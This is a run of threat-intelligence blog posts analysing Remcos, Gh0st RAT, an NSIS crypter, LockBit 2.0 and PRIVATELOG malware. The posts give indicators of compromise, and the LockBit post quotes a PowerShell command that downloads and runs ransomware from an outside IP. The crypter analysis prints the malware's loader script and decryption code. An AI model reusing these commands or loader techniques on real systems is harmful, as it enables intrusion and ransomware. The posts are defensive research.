With U.S. Tax Day approaching, Microsoft has observed phishing attacks targeting accounting and tax return preparation firms to deliver the Remcos remote access trojan (RAT) and compromise target networks beginning in February of this year. 
Remcos, which stands for “Remote Control and Surveillance”, is a closed-source tool that allows threat actors to gain administrator privileges on Windows systems remotely.
It was released in 2016 by BreakingSecurity, a European company that markets Remcos and other offensive security tools as legitimate software.
In 2021, CISA listed Remcos among its top malware strains, citing its use in mass phishing attacks using COVID-19 pandemic themes targeting businesses and individuals. 
While social engineering lures like this one are common around Tax Day and other big topic current events, these campaigns are specific and targeted in a way that is uncommon.
The targets for this threat are exclusively organizations that deal with tax preparation, financial services, CPA and accounting firms, and professional service firms dealing in bookkeeping and tax. 
This campaign can be detected in Microsoft Defender Antivirus, built into Windows and on by default, as well as Microsoft 365 Defender. 
The campaign uses lures masquerading as tax documentation sent by a client, while the link in the email uses a legitimate click-tracking service to evade detection.
The target is then redirected to a legitimate file hosting site, where the actor has uploaded Windows shortcut (.LNK) files. 
Figure 1.
Remcos malware phishing lure These LNK files generate web requests to actor-controlled domains and/or IP addresses to download malicious files.
These malicious files then perform actions on the target device and download the Remcos payload, providing the actor potential access to the target device and network. 
Microsoft is sharing this information along with detections and recommendations with the community to help users and defenders stay vigilant against this campaign with Tax Day approaching in the U.S. on April 18.
Microsoft 365 Defender and Microsoft Defender Antivirus detect and block Remcos and other malicious activity related to this campaign. 
Phishing campaign analysis What we have observed is that the link in the phishing email points to Amazon Web Services click tracking service at awstrack[.]me.
The initial link then redirects the target to a ZIP file hosted on legitimate file-sharing service spaces[.]hightail[.]com.
The ZIP file contains LNK files that act as Windows shortcuts to other files.
The LNK files make web requests to actor-controlled domains and IP addresses to download additional malicious files such as MSI files containing DLLs or executables, VBScript files containing PowerShell commands, or deceptive PDFs. 
Figure 2.
Unpacked file names referencing tax documents in the malware In some cases, GuLoader was used to execute shellcode and subsequently download Remcos on the target system.
GuLoader is a malicious downloader that has been used by many different actors to deliver a wide variety of malware, including several RATs such as Remcos, through phishing campaigns since it was first observed in the wild in December 2019.
The downloader uses several techniques to evade analysis and detection such as using legitimate file-sharing sites and cloud hosting services for payload storage and delivery as well as encryption and obfuscation of the GuLoader shellcode and payloads. 
Successful delivery of a Remcos payload could provide an attacker the opportunity to take control of the target device to steal information and/or move laterally through the target network. 
Figure 3.
Tax Day-themed Remcos attack chain We continue to learn from these campaigns to improve how we protect customers. 
Recommendations and detections Microsoft recommends the following mitigations to reduce the impact of this threat: Block JavaScript or VBScript from launching downloaded executable content Block executable files from running unless they meet a prevalence, age, or trusted list criterion Enable Microsoft Defender Antivirus scanning of downloaded files and attachments Enable Microsoft Defender Antivirus real-time behavior monitoring Enable cloud-delivered protection Detection details Microsoft Defender for Office 365 Microsoft Defender for Office 365 detects phishing emails associated with the campaign discussed in this blog. 
Microsoft Defender Antivirus Microsoft Defender Antivirus, on by default on Windows machines, detects threat components as the following malware: Backdoor:Win32/Remcos.
GA!MTB Microsoft Defender for Endpoint Alerts with the following titles in the security center can indicate threat activity on your network: ‘Remcos’ backdoor Suspicious ‘Remcos’ behavior ‘Remcos’ malware ‘Guloader’ malware Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytic (a series of analytics all prefixed with “TI map”) to automatically match the indicators mentioned in this blog post with data in their workspace.
If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.
More details on the Content Hub can be found here: https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy Indicators of compromise (IOCs) 
Domain:uymm[.]orgURL:https[:]//uymm[.]org/roman.msiSHA-256 hashes:23597910ec60cf8b97144447c5cddd2e657d09e2f2008d53a3834b6058f36a4195a2d34db66ce4507d05ac33bea3bdc054860d9d97e91bdc2ce7ce689ae06e9fac55905e6f5a2ab166f9a2ea7d1f4f68f5660f39b5c28b7746df1e9db6dd4430 References: 2021 Top Malware Strains | Cybersecurity and Infrastructure Security Agency (CISA) GuLoader: A Popular New VB6 Downloader that Abuses Cloud Services | Proofpoint US GuLoader: Peering Into a Shellcode-based Downloader | CrowdStrike The post Threat actors strive to cause Tax Day headaches appeared first on Microsoft Security Blog. 
title: Open-Source Gh0st RAT Still Haunting Inboxes 15 Years After Release url: https://cofense.com/blog/open-source-gh0st-rat-still-haunting-inboxes-15-years-after-release/ Found in Environments Protected by: ProofpointBy Nathaniel Raymond, Cofense IntelligenceGh0st RAT, a decades-old open-source remote administration tool (RAT), recently appeared in phishing campaigns targeting a healthcare organization.
Gh0st
Remote Administration Tool was created by a Chinese hacking group named C. Rufus Security Team that released it publicly in 2008.
The public release of Gh0st RAT source code made it easy for threat actors to obtain and tailor the tool to their needs.
Its feature set expanded over the years to include various surveillance, persistence, and information-stealing capabilities:taking full control of the infected machinerecording keystrokes in real time with offline logging availableaccessing live web cam feeds including microphone recordingdownloading files remotelyremote shutdown and rebootdisabling user inputOver
Gh0st RAT’s long life, Chinese nation-state threat actors have used it to breach high-value targets such as governments, embassies, economic targets, and media.
One such breach was the operation known as “GhostNet” in 2009, in which a large-scale cyber-attack used Gh0st RAT to conduct surveillance and espionage.
The breach impacted the Dalai Lama’s Tibetan exile centers in multiple countries.
Although Gh0st RAT was first identified in reports of threat activity almost 15 years ago, it is still actively distributed today.
Cofense Intelligence identified an email targeting a European-owned medical technology organization located in China, attempting to deliver Gh0st RAT via an embedded link.
The embedded link that hosted the malware was affiliated with Tencent and based in Hong Kong.
The sample’s command and control (C2) server is also located on the CHINANET Jiangsu province network in the city of Nanjing.
Figure 1: A screenshot of the recent phishing email used to deliver Gh0st RAT via an embedded link.
Figure 2: A translation of the body of the recent Gh0st RAT campaign shows that it used an unpaid invoice as a theme.
Although Ghost RAT has a history of use by nation-state threat actors, Cofense Intelligence does not have conclusive evidence that this recent campaign is associated with known nation-state activity.
The activity we observed activity shares certain characteristics with some advanced persistent threat (APT) groups, including APT27, which is known for intellectual property theft against healthcare and technology companies, and is also known for the use of Gh0st RAT.
However, since Gh0st RAT’s source code is publicly available, it remains plausible that any threat actor could download and modify the code for their own needs.
With Chinese universities (including more than one in Nanjing) being heavily involved in training talent for the Chinese defense industry, it is also plausible that students or other threat actors that are at times associated with APT groups may be carrying out independent threat activity using tools they are familiar with.
Figure 3: Details of the recent Gh0st RAT sample’s C2 server on the network information service Shodan.
Indicators of CompromiseFiles1680478346389.zipMD5: 9e6c45b6b8b20bf3c5959dbba8f27117LiveUpdate360.datMD5: f149d3f3ef0361ebe4d346811f29b527LiveUpdate.exeMD5: 96e4b47a136910d6f588b40d872e7f9dsetting.iniMD5: 91aab4bbe634be62d11d132738c23a82SqlVersion9.dllMD5: 317f9ff06c076e87e5b1d11242396d5fú¿╡τ-╫╙-╖ó-╞▒ú⌐.exeMD5: 4723a2a8f68c1eaf82809cff29b8e56fURLshxxps://api[.]youkesdt[.]asia/admin/down/hash/79b7c6ed-c4d8-4b36-b1cd-f968e6570010hxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/SqlVersion9[.]dllhxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/Media[.]xmlhxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/LiveUpdate360[.]dathxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/LiveUpdate[.]exehxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/223[.]114[.]txtCommand and Controlhxxp://61[.]160[.]223[.]114:18076All third-party trademarks referenced by Cofense whether in logo form, name form or product form, or otherwise, remain the property of their respective holders, and use of these trademarks in no way indicates any relationship between Cofense and the holders of the trademarks.
Any observations contained in this blog regarding circumvention of end point protections are based on observations at a point in time based on a specific set of system configurations.
Subsequent updates or different configurations may be effective at stopping these or similar threats.
Past performance is not indicative of future results.
The Cofense® and PhishMe® names and logos, as well as any other Cofense product or service names or logos displayed on this blog are registered trademarks or trademarks of Cofense Inc. 
The post <strong>Open-Source Gh0st RAT Still Haunting Inboxes 15 Years After Release</strong> appeared first on Cofense. 
title: Revisiting the NSIS-based crypter url: https://blog.malwarebytes.com/threat-analysis/2021/05/revisiting-the-nsis-based-crypter/ 
This blog post was authored by hasherezade NSIS (Nullsoft Scriptable Install System) is a framework dedicated to creating software installers.
It allows to bundle various elements of an application together (i.e. the main executable, used DLLs, configs), along with a script that controls where are they going to be extracted, and what their execution order is.
It is a free and powerful tool, making distribution of software easier.
Unfortunately, its qualities are known not only to legitimate developers but also to malware distributors. 
For several years we have been observing malware distributed via NSIS-based crypters.
The outer layer made of a popular and legitimate tool makes for a perfect cover.
The flexibility of the installer allows to implement various ideas for obfuscating malicious elements.
We wrote about unpacking them in the past, i.e. here, and here.
With time their internal structure has evolved, so we decided to revisit them and describe the inside again using samples from some of the Formbook stealer campaigns. 
Samples This analysis is based on the following samples: 8F80426CEC76E7C9573A9C58072399AF carrying a Formbook sample: 05dc8c8d912a58a5dde38859e741b2c098061CCF694005A78FCF0FBC8810D137carrying a Formbook sample: f34bd301f4f4d53e2d069b4842bca672 Inside Like every NSIS-based installer, this executable is an archive that can be unpacked with the help of 7zip.
The older versions of 7zip (i.e.15.05) were also able to extract the NSIS script:
[NSIS].nsi.
Unfortunately, in the newer releases script extraction is no longer supported. 
Once we unpack the file, we can see several elements, as well as directories typical for NSIS: 
The System.dll is a DLL typical for any NSIS installer, responsible for executing the commands from the script.
It is the first component of the archive to be loaded.
We can find it in each of the samples. 
What is more interesting are the files in the main directory.
The first one, 1 KB in size, is a shellcode.
It starts from bytes: 0x55, 0x8B, 0xEC, 0x81, 0xEC Analogous shellcode can be found in the second sample from this campaign. 
In the same directory there are two other files.
One of them is around 7 KB, and the next: much bigger.
Both of them are encrypted, and to find out what they contain we need to analyze the full chain of loading. 
Looking inside the NSIS script we can see the performed actions that are very simple: Function .onInit InitPluginsDir SetOutPath
$INSTDIR File 5e9ikl8w3iif7ipp6 File 3ugs67ip868x5n File tjdorfrldbgdlq System::Alloc 1024 Pop $0 System::Call "kernel32::CreateFile(t'$INSTDIR\tjdorfrldbgdlq', i 0x80000000, i 0, p 0, i 3, i 0, i 0)i.r10" System::Call "kernel32::VirtualProtect(i r0, i 1024, i 0x40, p0)p.r1" System::Call "kernel32::ReadFile(i r10, i r0, i 1024, t., i 0)
i .r3
" System::Call ::$0() Call func_80 
[...] The first file of the set (containing the shellcode) is read into the executable memory.
Then, the loaded module is just called. 
Shellcode #1 – functionality If we load those shellcodes into IDA we can see their functionality very clearly, as they are not obfuscated. 
Shellcode from sample #1: Shellcode from sample #2 Although the code is a bit different in both, they can be divided with the same steps and building blocks. 
The name of the next file is loaded as a stack-based wide stringThe base of kernel32.dll is fetched from PEBA set of function from kernel32.dll is retrieved – each of them by the name’s checksums.
Functions are always the same – dedicated to reading the file from the disk: CreateFileW, GetTempPathW, lstrcatW, ReadFile, VirtualAlloc, GetTempPathW.The function GetTempPathW is used to retrieve the path to the %TEMP% directory, where all the components from the archive were automatically extracted at runtime of the NSIS fileThe name of the next file is concatenated to the the %TEMP% pathMemory is allocated for the file content, and the file is read into this bufferA custom decryption algorithm is being applied on the buffer (the algorithm is different for different samples).
The buffer turns out to be a next shellcodeFinally, the next shellcode is executed The name of the next file is loaded as a stack-based wide string The hashing function used for import resolving follows the same pattern in both cases, yet the constant used to initialize it (denoted as HASH_INIT) is different across the samples. 
int __
stdcall
calc_hash(char
*name) { int next_chunk; int hash; for ( hash = HASH_INIT; ; hash = next_chunk + 33 * hash ) { next_chunk = *name++; if ( !next_chunk ) break; } return hash; } view raw nsis_calc_hash.cpp hosted with :red_heart: by GitHub The algorithm used for the buffer decryption differs across the samples. 
The second shellcode revealed after the unpacking algorithm finished processing Shellcode #2 – functionality This shellcode is used for decrypting and loading the final payload (PE file) from the third of the encrypted files.
It is unpacked and ran by the previous layer.
In the analyzed cases, this element was around 7-8 KB. 
This shellcode is similarly structured as the previous one.
It starts by preparation of the strings: stack-based strings are being pushed.
One of them is the name of the next file that is going to be loaded.
Also, the key that will be used for the decryption is prepared. 
The next step is loading of the imported functions.
As before, they are resolved by their hashes. 
Then the functions are used to load and decrypt the payload.
If loading the next stage has failed, the installer will restart itself. 
The decryption function is custom, similar (but not identical) to RC4: void __stdcall decrypt_buf(BYTE *data, BYTE *key, unsigned int size) { BYTE key_stream[512]; int j; char next; 
int i; int v6 = 0; int v4 = 0; for ( i = 0;
i < 256; ++i ) { key_stream[i + 256] = i; key_stream[i] = key[i % size]; } for ( i = 0; i < 256; ++i ) { v6 = (key_stream[i] + v6 + key_stream[i + 256]) % 256; next = key_stream[v6 + 256]; key_stream[v6 + 256] = key_stream[i + 256]; key_stream[i + 256] = next; } v6 = 0; for ( j = 0; j < DATA_SIZE; ++j ) { i = (i + 1) % 256; v6 = (v6 + key_stream[i + 256]) % 256; next = key_stream[v6 + 256]; key_stream[v6 + 256] = key_stream[i + 256]; key_stream[i + 256] = next; v4 = (key_stream[v6 + 256] + key_stream[i + 256]) % 256; data[j] ^=
key[j % size]; data[j] ^= key_stream[v4 + 256]; } } view raw nsis_decrypt.cpp hosted with :red_heart: by GitHub 
This algorithm is common to both analyzed samples – yet the decryption key differs. 
Loading PE After the PE is decrypted, the function for its loading is deployed. 
The payload is implanted into a newly created suspended process (a new instance of the current executable) using one of the most popular techniques of PE injection: Process Hollowing (a.k.a. RunPE).
The content of the payload is mapped into the new process using low level APIs: NtCreateSection, NtMapViewOfSection.
Then, the Entry Point is redirected to the new executable via SetThreadContext, and finally the execution is resumed with NtResumeThread. 
The authors used several common techniques to obfuscate this process. 
As before, the used functions are loaded by their checksums.
The PE loading function makes a use of the following set: The low-level functions, directly related with performing the injection, are called via raw syscalls retrieved directly from NTDLL.
Also in this case, functions has been resolved by their hashes. 
List of used functions (with corresponding hashes). 
4b1a50d1 : NtCreateSection 
e0ddd5cb : NtMapViewOfSection 20b0f111 : NtResumeThread 81af6d4e : NtUnmapViewOfSection be530033 : NtWriteVirtualMemory The code used to resolve the hashes is available here: hash_resolver.cpp. 
Overview of the PE loader Manual syscalls calling 
In order to make the injection stealthier, the loader uses a common technique of “stealing syscalls”, also known as “hell’s gate”.
This technique is based on the fact that some low-level DLLs, such as NTDLL, contain numbers of raw syscalls.
By extracting the syscalls, and executing them manually, the malware can use the API of the operating system, without a need of calling functions from the DLL.
That allows to bypass some monitoring in the situation if the system DLLs are hooked.
More in-depth analysis of this technique was described here. 
Firstly, a fresh copy of NTDLL is loaded from the file on the disk, an manually mapped.
Then, a function defined by its hash is retrieved (using the same hashing algorithm that was used to retrieve imports from normally loaded DLLs): After the pointer to the beginning of the function is fetched, a small disassembling loop is used to find the familiar pattern: moving the ID of the syscall into EAX register. 
The syscall ID is returned for further use. 
Once the syscall number has been extracted, the malware intends to execute it from its own code.
However, a 32-bit application cannot make direct syscalls on 64-bit system, since it is not native.
In such cases, syscalls are usually made via Wow64 emulation layer.
In order to make them directly, the authors of the malware switch to the 64-bit mode first: using a technique called “Heaven’s Gate”. 
The malware comes with two variants of the stub executing a syscall.
The decision for which of the versions should be applied is made based on the check if the process runs as Wow64 (emulated 32 bit on 64 bit Windows): If the process runs on a 32-bit system, the syscall can be made in a direct way, using SYSENTER: 
If the system is 64-bit, the malware (that is 32-bit) switches into 64-bit mode via “Heaven’s Gate”. 
Far return to the address prefixed with 0x33 segment – entering the 64-bit mode Once the execution mode is changed into 64 bit, the syscall is called, its results stored, and the application can switch back to 32-bit mode to continue normal execution. 
The 64-bit code, executed after the mode is switched via Heaven’s Gate Evolution This crypter has been around for several years, and during this time it went through several phases of evolution.
In this part of the analysis we will compare it with the earlier version from February of this year, described in the following writeup. 
In contrast to the current one, the version from February contained a malicious component in the form of a DLL.
We can also find a second, encrypted component, which carries the payload. 
The extracted NSIS script contains a different sequence of commands: Function .onInit SetOutPath
$INSTDIR File $INSTDIR\o15bmldpqdxcin.dll File $INSTDIR\emvmcmzr.n System::Call $INSTDIR\o15bmldpqdxcin.dll::Gxkeoxkzs(w$\"$INSTDIR\emvmcmzr.n$\") DetailPrint label StrCpy $0 9 IntOp $0 $0 + 4 Goto $0 DetailPrint done FunctionEnd In this case, the standard NSIS component (System.dll) is used to call the function exported from the DLL, passing the path to the encrypted component as a parameter. 
Looking inside the exported function we can find a significant similarity to the Shellcode #1 which was described in the former part of this writeup. 
As before, we can see decryption of the next stage with the help of a custom algorithm.
This time, the next stage is contained in a buffer hardcoded in the DLL (rather than stored in a separate file).
It contains a very similar function dedicated to decrypting and loading the final payload.
Yet, we can see some minor differences. 
First of all, the file name is passed dynamically rather than hardcoded. 
Second, we can see a check against blacklisted processes.
Their names are hashed, and compared to the hardcoded list of hashes (i.e. 0x26090612 -> “avgui.exe”).
This type of checks are among common evasion techniques.
However, in this case, detection of a forbidden process only delays execution, and does not suspend it or terminate.
Possibly it is a bug in the implementation, and the if statement was intended to be a while loop instead.
Nevertheless, the authors decided to give up the check in the latest version. 
Apart from those details, this stage is identical to the Shellcode #2 from the newer version. 
Popular and persistent 
This packer has been around for many years, and probably will stay with us for some years to come.
Its structure shows that it is created by experienced authors, using well known, yet not trivial techniques.
Its evolution is slow but steady.
Usage of a popular installation engine makes it easy to blend in with legitimate applications. 
Its popularity and diversity of payloads suggests that it is not linked to one specific actor, but rather sold as an independent component on one of many underground forums. 
Appendix Other materials about previous versions of NSIS-based crypters: https://yoroi.company/research/yes-cyber-adversaries-are-still-using-formbook-in-2021/https://www.welivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombia/https://news.sophos.com/en-us/2020/05/14/raticate/https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ransomware-families-use-nsis-installers-to-avoid-detection-analysis/https://www.microsoft.com/security/blog/2017/03/15/ransomware-operators-are-hiding-malware-deeper-in-installer-packages/https://isc.sans.edu/forums/diary/Quick+analysis+of+malware+created+with+NSIS/23703/ The post Revisiting the NSIS-based crypter appeared first on Malwarebytes Labs. 
title: LockBit Ransomware 2.0 Resurfaces url: https://blog.cyble.com/2023/06/06/lockbit-ransomware-2-0-resurfaces/ Threat Actor Targeting Korean Users through malicious Document Files Cyble Research and Intelligence Labs (CRIL) recently discovered an ongoing campaign associated with the notorious ransomware group LockBit. 
LockBit has been actively operating since September 2019 and consistently employs various methods to spread its malware.
These tactics include distributing phishing emails containing malicious files, utilizing drive-by downloads, and exploiting vulnerabilities in the remote desktop protocol (RDP).
As a result, LockBit has established itself as a prominent and active threat actor in the realm of ransomware. 
The LockBit ransomware group utilizes a double extortion technique to enhance their likelihood of obtaining ransom payments from victims.
This technique encompasses multiple stages, including data encryption to render victim data inaccessible and threats to release stolen data on designated leak sites.
By employing this approach, the group aims to exert significant pressure on victims, compelling them to comply with their demands and pay the ransom. 
LockBit ransomware’s maldocs campaign, initially detected in 2022, had specifically targeted individuals in Korea.
In their latest campaign, LockBit has once again embraced the approach of disseminating malware through malicious document files targeting Korean individuals.
Notably, the group utilized the same template injection techniques to deliver their payload. 
The figure below depicts the delivery method employed by the LockBit ransomware group. 
Figure 1 – Lockbit’s Delivery Mechanism Technical Analysis For analysis purposes, we have taken a specific sample (sha256: 7391bbd59330e79f8ee4a01e5ed20df5ab183737f2b91f926b649facd8d2d278) which is a .docx file commonly known as Office Open XML (OOXML).
OOXML files are essentially packaged ZIP archives that consist of multiple XML files called parts.
These parts contain various properties that collectively determine the document’s display and processing.
Within these parts, certain properties may reference shared public resources accessible through online URLs. 
It is also observed that the original filenames of the identified .docx samples were written in the Korean language. 
The below image shows the malicious document. 
Figure 2 – malicious document Upon opening the malicious document, it attempts to establish a connection with the remote server to retrieve the subsequent component of the attack.
This process involves multiple stages of execution. 
In the initial stage, a URL hosting the malicious template file (.dotm) is injected into settings.xml.rels file that resides within the document package.
This enables the document to fetch the .dotm file from the remote server required for further actions.
This technique employed by the attackers aligns with CVE-2017-0199. 
The below image shows the extracted content of the document file. 
Figure 3 – Extracted content of docx file The below figure displays the contents of the settings.xml.rels file, highlighting the inclusion of a malicious URL and the presence of the Target mode within the settings.xml.rels file. 
Figure 4 – settings.xml.rels file content Once a successful connection to the remote server is established, a malicious template file is downloaded and executed.
The downloaded template file contains an obfuscated VBA macro.
TAs have opted for this technique due to its ability to bypass detection mechanisms.
Unlike traditional methods that rely on suspicious indicators such as macros, this technique does not require their presence in the document until the malicious template is retrieved. 
The image below displays the de-Obfuscated VBA content from the downloaded template file. 
Figure 5 – De-obfuscated macro content The VBA script incorporates a PowerShell command mentioned below to trigger the retrieval of the final stage payload, which is an executable file named “tinytask.exe” from the remote server. 
Following the successful download, the script saves the obtained payload in the directory “C:\Users\Public\456trytgre3e45yrthtgr.exe” on the compromised system and proceeds to execute it. 
“cmd /c powershell/W 01 curl hxxp://91[.]107[.]210[.]207/tinytask.exe -o C:\Users\Public\456trytgre3e45yrthtgr.exe; C:\Users\Public\456trytgre3e45yrthtgr.exe” The downloaded payload is Lockbit ransomware 2.0. 
LockBit Ransomware: After the LockBit ransomware successfully executes on a system, it initiates a series of actions.
These actions include encrypting files with .lockbit extension, modifying Windows automatic backups by deleting shadow copies using vssadmin.exe, disabling startup repairs using the bcdedit tool, and more. 
The below figure shows the encrypted files with the .lockbit extension. 
Figure 6 – Encrypted files & Extensions Additionally, the ransomware leaves a ransom note that provides detailed instructions for making the required payment, as shown in the below figure. 
Figure 7 – Lockbit’s Ransom note We recommend referring to our previous blog post to comprehensively examine LockBit 2.0 and Lockbit 3.0 ransomware. 
Conclusion The Lockbit ransomware has taken a surprising turn by adopting the old strategy of distributing its payload through malicious documents.
This shift in behavior has caught us off guard, making it difficult to predict the motives behind this change.
However, it is evident that Lockbit remains a significant threat, continuously evolving and expanding its capabilities.
Therefore, users must remain vigilant and adopt robust security measures to protect against potential Lockbit ransomware attacks. 
Cyble Research & Intelligence Labs continuously monitor ransomware campaigns and will keep updating our readers with the latest information. 
Our Recommendations We have listed some essential cybersecurity best practices that create the first line of control against attackers.
We recommend that our readers follow the best practices given below: Safety Measures Needed to Prevent Ransomware Attacks Conduct regular backup practices and keep those backups offline or in a separate network. 
Turn on the automatic software update feature on your computer, mobile, and other connected devices wherever possible and pragmatic. 
Use a reputed anti-virus and Internet security software package on your connected devices, including PC, laptop, and mobile. 
Refrain from opening untrusted links and email attachments without verifying their authenticity. 
Users Should Take the Following Steps After the Ransomware Attack Detach infected devices on the same network. 
Disconnect external storage devices if connected. 
Inspect system logs for suspicious events. 
Impact of Ransomware Loss of Valuable data. 
Loss of the organization’s reputation and integrity. 
Loss of the organization’s sensitive business information. 
Disruption in organization operation. 
Financial loss. 
MITRE ATT&CK:registered: Techniques Tactic Technique ID Technique Name ExecutionT1059 T1204Command and Scripting Interpreter User ExecutionDiscoveryT1082 T1083System Information Discovery File and Directory DiscoveryDefense EvasionT1070Delete shadow drive dataImpactT1486 T1490 Data encrypted for impact Inhibit System RecoveryCommand and controlT1071Application Layer ProtocolIndicators of Compromise (IOCs) 
Indicators Indicator Type Description 7391bbd59330e79f8ee4a01e5ed20df5ab183737f2b91f926b649facd8d2d278 462e39e554bd3abb9ecdcec92d861b315f1efb77 2831b37cf521848142e8a5d69515b065Sha256 Sha1 Md5Malicious docx filed833c23bad7b1988832524bce8a6355c97d031bb3852f671e52fdf9024bd6ec0 32a155dbb9652dd88ae41044e342c1ef92f7e6f2 5e7b650a6e0070bceed648681bff20feSha256 Sha1 Md5Malicious docx file78db865edcf1bcd27b765c458ef1675233b11947dfceef7c45fdd254ae514a3f 2a6df9fa510af4d3e7fde1002ad54c5576abbc07 9a1cac28f716d2e660f2bd6297cd560bSha256 Sha1 Md5 Malicious .dotm file8022060ef633e157518037122a6003813cc0a3066d456a1164275a211efc8f5c 32a155dbb9652dd88ae41044e342c1ef92f7e6f2 5e7b650a6e0070bceed648681bff20fe Sha256 Sha1 Md5 Lockbit ransomwarehxxp://91[.]107[.]210[.]207/tinytask[.]exe hxxp://91[.]107[.]210[.]207/b66ssc[.]dotmURLS 
title: Too Log; Didn't Read — Unknown Actor Using CLFS Log Files for Stealth url: http://internal-www.fireeye.com/blog/threat-research/2021/09/unknown-actor-using-clfs-log-files-for-stealth.html The Mandiant Advanced Practices team recently discovered a new malware family we have named PRIVATELOG and its installer, STASHLOG. 
In this post, we will share a novel and especially interesting technique the samples use to hide data, along with detailed analysis of both files that was performed with the support of FLARE analysts. 
We will also share sample detection rules, and hunting recommendations to find similar activity in your environment. 
Mandiant has yet to observe PRIVATELOG or STASHLOG in any customer environments or to recover any second-stage payloads launched by PRIVATELOG.
This may indicate malware that is still in development, the work of a researcher, or targeted activity. 
CLFS and Transaction Files PRIVATELOG and STASHLOG rely on the Common Log File System (CLFS) to hide a second stage payload in registry transaction files. 
CLFS is a log framework that was introduced by Microsoft in Windows Vista and Windows Server 2003 R2 for high performance.
It provides applications with API functions—available in clfsw32.dll—to create, store and read log data. 
Because the file format is not widely used or documented, there are no available tools that can parse CLFS log files.
This provides attackers with an opportunity to hide their data as log records in a convenient way, because these are accessible through API functions. 
This is similar in nature to malware which may rely, for example, on the Windows Registry or NTFS Extended Attributes to hide their data, which also provide locations to store and retrieve binary data with the Windows API. 
In Microsoft Windows, CLFS is notably used by the Kernel Transaction Manager (KTM) for both Transactional NTFS (TxF) and Transactional Registry (TxR) operations.
These allow applications to perform a number of changes on the filesystem or registry, all grouped in a single transaction that can be committed or rolled back.
For example, to open a registry key in a transaction, the functions RegCreateKeyTransacted(), RegOpenKeyTransacted(), and RegDeleteKeyTransacted() are available. 
Registry transactions are stored in dedicated files with the following naming scheme: <hive><GUID>.TMContainer<number>.regtrans-ms or <hive><GUID>.TxR.<number>.regtrans-ms. 
These are CLFS containers that are referenced in a master .blf
file that only contains metadata and can be found in various locations including user profile directories. 
Registry transaction forensics were briefly explored in a previous blog post.
The CLFS master and container file formats are mostly undocumented; however, previous research is available on GitHub. 
Malware Obfuscation As with many malware families, most of the strings used by PRIVATELOG and STASHLOG are obfuscated.
Yet the technique observed here is uncommon and relies on XOR’ing each byte with a hard-coded byte inline, with no loops.
Effectively, each string is therefore encrypted with a unique byte stream. 
Figure 1: Sample string deobfuscation for "PrintNotify" Interestingly, some of the deobfuscated strings from the installer are used for logging error messages and have spelling errors or typos such as: Log index=%d, data border exceed bounday.\n Interal data hash mismatch.\n Log buffer size=%u too small, expect aleast %u bytes.\n Introducing STASHLOG In addition to containing obfuscated strings, the installer’s code is protected using various control flow obfuscation techniques that make static analysis cumbersome.
Figure 2 is a graph overview of the installer’s main() function demonstrating the effects of the control flow obfuscation. 
Figure 2: Graph view of main() STASHLOG has two different modes of operation: Without any arguments, during which it will prepare the environment With a single argument, which is a file that should be hidden in a CLFS file Preparing the Environment Executed without arguments, the installer prints two values to the console: The GUID returned from the registry value of HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID A 56-byte value derived from a randomly generated GUID with CoCreateGUID() Figure 3: Sample console output The 56-byte value is a concatenation of the random GUID, its SHA1 hash, and the SHA1 hash of the previous values.
So: GUID+sha1(GUID)+sha1(GUID+sha1(GUID)). 
The randomly generated GUID is stored as a string in the GlobalAtom table, prefixed with win::.
This table resides in memory and contains strings with their identifiers available to all applications. 
If a string prefixed with win:: already exists when the installer is executed, then the pre-existing GUID in the GlobalAtom table is reused. 
Effectively, when executed with no arguments, the installer generates and prints out encryption keys that the actor uses to pre-encrypt the payload before it is written to disk. 
Stashing the Payload When launched with an argument, the installer opens and decrypts the contents of the file passed as an argument.
It verifies that the file is suffixed by its SHA1 hash, and then generates the same 56-byte value using the stored GlobalAtom GUID string in memory. 
The 56-byte value is SHA1 hashed again and the first 16-bytes form the initialization vector (IV), while the key is the 16-byte MachineGUID value from the host’s registry.
The encryption algorithm is HC-128, which is rarely seen used in malware. 
The expected decrypted file contents have a 40-byte header: struct payloadHeader { DWORD magic; DWORD minWinVer; DWORD maxWinVer; DWORD totalSize; WORD numBlocks; WORD unknown; BYTE sha1sum[20]; } In the analyzed installer, the “magic” value is referred to as a checksum; however, STASHLOG verifies this value matches the hard-coded value 0x00686365.
The number of blocks, specified at offset 16, must be between 2 and 5.
The malware also checks that the operating system version is within a lower and upper boundary and that the SHA1 hash of the decrypted data matches the payload header value at offset 20. 
Following the payload header, the malware expects blocks of encrypted data with 8-byte headers.
Each block header has the following structure: struct blockHeader { DWORD magic; DWORD blockSize; } Once the malware has checked and validated the structure of the payload, it searches for .blf files in the default user’s profile directory and uses the .blf file with the oldest creation date timestamp. 
In practice, the malware should typically find the file used for registry transaction logs: C:\Users\Default\NTUSER.DAT<GUID>.TM.blf If a matching .blf file is indeed found, it is opened with the CreateLogFile() API from clfsw32.dll.
This function opens CLFS logs and expects a file name in the following format, without the .blf extension: log:<LogName>[::<LogStreamName>] The log file is reset using the CloseAndResetLogFile() function and will be opened again to insert the data. 
Before inserting data into the CLFS log file, the malware decrypts each block using HC-128.
The key is the 16-byte atom GUID and the IV is the first 16-bytes of the atom GUID SHA1 hash.
Each block is then re-encrypted with the new key material as follows: The encryption key is the 16-byte GUID from GetVolumeNameForVolumeMountPointW().
The IV is the first 16-bytes of the SHA1 hash of the concatenated GUIDs from: GetVolumeNameForVolumeMountPointW() The registry value HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID The contents are written to the CLFS log file using the clfsw32.dll API function ReserveAndAppendLog().
The payload header is written to the log file as the first entry, followed by separate entries for each block. 
The data is effectively stored in the first container file for the registry transaction log: C:\Users\Default\NTUSER.DAT<GUID>.TMContainer00000000000000000001.regtrans-ms. 
Onto PRIVATELOG The PRIVATELOG sample recovered by Mandiant is an un-obfuscated 64-bit DLL named prntvpt.dll.
It contains exports, which mimic those of legitimate prntvpt.dll files, although the exports have no functionality.
PRIVATELOG expects to be loaded from PrintConfig.dll, which is the main DLL of a service named PrintNotify, via DLL search order hijacking. 
